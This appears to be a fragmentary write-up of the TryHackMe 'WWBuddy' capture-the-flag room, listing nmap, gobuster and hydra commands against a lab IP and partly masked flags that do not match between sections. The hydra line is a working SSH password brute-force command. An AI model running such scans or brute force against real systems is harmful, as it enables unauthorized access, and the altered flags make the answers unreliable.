...
```
bibo318@parrot:~/CTFs/tryhackme/WWBuddy$ sudo nmap -A -sS -sC -sV -O 10.10.217.243
...
```
bibo318@parrot:~/CTFs/tryhackme/WWBuddy$ gobuster dir -h http://10.10.217.243 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
...
bibo318@parrot:~/CTFs/tryhackme/WWBuddy$ gobuster dir -u http://10.10.217.243 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
...
THM{V0N318*****g4d0_d+_kkkk}
```

```
bibo318@parrot:~/CTFs/tryhackme/WWBuddy$ hydra -f -l jenny -P pass.txt -t 64 10.10.217.243 ssh
...
THM{V0N318*****ch4ng3_th3_3nv1r0nm3nt}
```
...
`THM{V0N318*****d0nt_try_4nyth1ng_funny12**123:))}`

2. User flag

`THM{V0N318*****g4d0_d+_kkkk12**123:))}`

3. Root flag

`THM{V0N318*****ch4ng3_th3_3nv1r0nm3nt12**123:))}`
